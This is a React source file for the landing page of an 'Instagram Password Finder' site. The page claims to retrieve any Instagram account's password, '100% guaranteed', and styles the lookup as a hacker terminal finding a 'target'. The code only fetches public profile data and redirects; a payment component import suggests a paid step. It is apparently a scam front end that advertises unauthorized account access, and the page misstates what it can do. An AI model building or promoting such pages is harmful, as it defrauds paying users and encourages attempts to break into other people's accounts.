
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useHackerContext } from "@/context/HackerContext";
import { toast } from "sonner";
import { Lock, Instagram, Sparkles, ArrowRight, RefreshCw, Youtube } from "lucide-react";
import { fetchAccountDetails } from "@/services/apiService";
import ProfileSection from "@/components/payment/ProfileSection";

const Index = () => {
  const [inputUsername, setInputUsername] = useState("");
  const [loading, setLoading] = useState(false);
  const { 
    username, 
    setUsername, 
    profileData,
    setProfileData, 
    setIsLoading, 
    setError, 
    setProfilePic 
  } = useHackerContext();

  const navigate = useNavigate();

  // Username validation function
  const validateUsername = (username: string): { isValid: boolean; message?: string } => {
    // Remove white spaces
    const trimmedUsername = username.trim();
    
    // Check length
    if (trimmedUsername.length > 30) {
      return { isValid: false, message: "Username must not exceed 30 characters" };
    }
    
    // Check for valid characters (letters, numbers, periods, underscores)
    const validUsernamePattern = /^[a-zA-Z0-9._]+$/;
    if (!validUsernamePattern.test(trimmedUsername)) {
      return { isValid: false, message: "Username can only contain letters, periods, numbers, or underscores" };
    }
    
    return { isValid: true };
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!inputUsername) {
      toast.error("Please enter an Instagram username");
      return;
    }

    // Clean the username (remove whitespace)
    const cleanedUsername = inputUsername.trim();
    
    // Validate the username
    const validation = validateUsername(cleanedUsername);
    if (!validation.isValid) {
      toast.error(validation.message);
      return;
    }
    
    console.log("[Index] Submit handler started for username:", cleanedUsername);
    setLoading(true);
    setIsLoading(true);
    setError(null);
    
    try {
      // Set username immediately for UI preview
      setUsername(cleanedUsername);
      console.log("[Index] Username set to context:", cleanedUsername);
      
      // Fetch account details
      console.log("[Index] Calling fetchAccountDetails API");
      const accountData = await fetchAccountDetails(cleanedUsername);
      console.log("[Index] API call completed, received data:", accountData ? "yes" : "no");
      
      if (accountData) {
        console.log("[Index] Processing account data:", {
          username: accountData.username,
          fullName: accountData.full_name,
          isVerified: accountData.is_verified,
          hasProfilePic: !!accountData.profile_picture || !!accountData.profile_pic_url
        });
        
        // Store in context
        setUsername(accountData.username);
        setProfileData(accountData);
        
        // Make sure to set the profile picture separately in context
        const profilePicUrl = accountData.profile_picture || accountData.profile_pic_url;
        if (profilePicUrl) {
          console.log("[Index] Setting profile pic URL:", profilePicUrl.substring(0, 50) + "...");
          setProfilePic(profilePicUrl);
        } else {
          console.warn("[Index] No profile pic URL found in account data");
        }
        
        toast.success("Target found! Redirecting to user verification...");
        console.log("[Index] Success toast shown, preparing to navigate");
        
        // Direct to user info page
        setTimeout(() => {
          console.log("[Index] Navigating to /user-info");
          navigate("/user-info");
        }, 1000);
      } else {
        console.error("[Index] Account data is null");
        // If null is returned, the API service already displayed an error toast
        setError(`Invalid account details: @${cleanedUsername}`);
      }
    } catch (error) {
      console.error("[Index] Error in submit handler:", error);
      setError(`Invalid username: @${cleanedUsername}`);
      toast.error("Invalid username or connection issue. Please try again.");
    } finally {
      console.log("[Index] Submit handler completed");
      setLoading(false);
      setIsLoading(false);
    }
  };

  const handleTutorialClick = () => {
    // Open YouTube tutorial in new tab
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
  };

  return (
    <div className="min-h-screen w-full bg-gradient-to-b from-[#080C18] to-[#101729] px-4 py-8 sm:py-12 flex flex-col items-center justify-center">
      <div className="w-full max-w-md space-y-8">
        <div className="text-center">
          <div className="flex justify-center mb-4">
            <div className="rounded-full bg-[#151f32] p-3 border-2 border-[#3CEFFF]/30 shadow-lg shadow-[#3CEFFF]/20">
              <Lock className="h-8 w-8 text-[#3CEFFF]" />
            </div>
          </div>
          <h1 className="text-3xl font-bold text-white mb-2">
            Instagram Password Finder
          </h1>
          <p className="text-[#94A3B8] max-w-xs mx-auto">
            Get any Instagram account password in just few minutes
          </p>
          
          <div className="flex items-center justify-center gap-2 mt-4">
            <Sparkles className="h-4 w-4 text-[#3CEFFF]" />
            <span className="text-xs text-[#3CEFFF] font-medium">
              WORKS 100% GUARANTEED
            </span>
            <Sparkles className="h-4 w-4 text-[#3CEFFF]" />
          </div>

          {/* Tutorial Button */}
          <Button
            onClick={handleTutorialClick}
            variant="secondary"
            className="mt-4 bg-[#151f32] hover:bg-[#1a2236] text-white border border-[#3CEFFF]/20"
          >
            <Youtube className="h-4 w-4 mr-2" />
            How to Use - Tutorial
          </Button>
        </div>
        
        {loading && inputUsername && (
          <div className="animate-fade-in">
            <ProfileSection 
              username={inputUsername} 
              profileData={null} 
              isLoading={true}
            />
          </div>
        )}
        
        <div className="bg-[#111827] rounded-xl border border-[#1E293B] shadow-lg overflow-hidden p-5">
          <div className="text-[#3CEFFF] text-xs mb-4 font-mono">
            <span className="text-[#94A3B8]">[root@system]$ </span>
            <span className="animate-pulse">
              starting password finder...
            </span>
          </div>
          <form onSubmit={handleSubmit} className="space-y-5">
            <div className="space-y-2">
              <label className="flex items-center gap-2 text-xs text-[#94A3B8] mb-1">
                <Instagram className="h-3.5 w-3.5" /> ENTER USERNAME
              </label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-[#94A3B8]">@</span>
                <Input
                  type="text"
                  placeholder="Type Instagram username here"
                  value={inputUsername}
                  onChange={(e) => setInputUsername(e.target.value)}
                  className="bg-[#151f32] border-[#1E293B] focus:border-[#3CEFFF] focus:ring-[#3CEFFF]/20 pl-8 placeholder:text-[#94A3B8]/50"
                />
              </div>
            </div>
            
            <Button 
              type="submit" 
              className="w-full py-5 bg-gradient-to-r from-[#3CEFFF] to-[#2E7CF6] hover:from-[#3CEFFF] hover:to-[#4B89F2] text-[#080C18] font-medium shadow-lg shadow-[#3CEFFF]/20 border border-[#3CEFFF]/30"
              disabled={loading}
            >
              {loading ? (
                <span className="flex items-center gap-2">
                  <RefreshCw className="h-4 w-4 animate-spin" />
                  Finding Password...
                </span>
              ) : (
                <span className="flex items-center gap-2">
                  Get Password Now
                  <ArrowRight className="h-4 w-4" />
                </span>
              )}
            </Button>
          </form>
          
          <div className="flex items-center justify-center mt-6 border-t border-[#1E293B] pt-4">
            <div className="text-sm text-[#3CEFFF] flex items-center gap-1.5">
              <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
              System ready
            </div>
          </div>
        </div>
        
        <div className="text-center text-xs text-[#94A3B8]">
          <p>For educational purpose only. This is demo website.</p>
          <p>© 2025 Firestars.co</p>
        </div>
      </div>
    </div>
  );
};

export default Index;
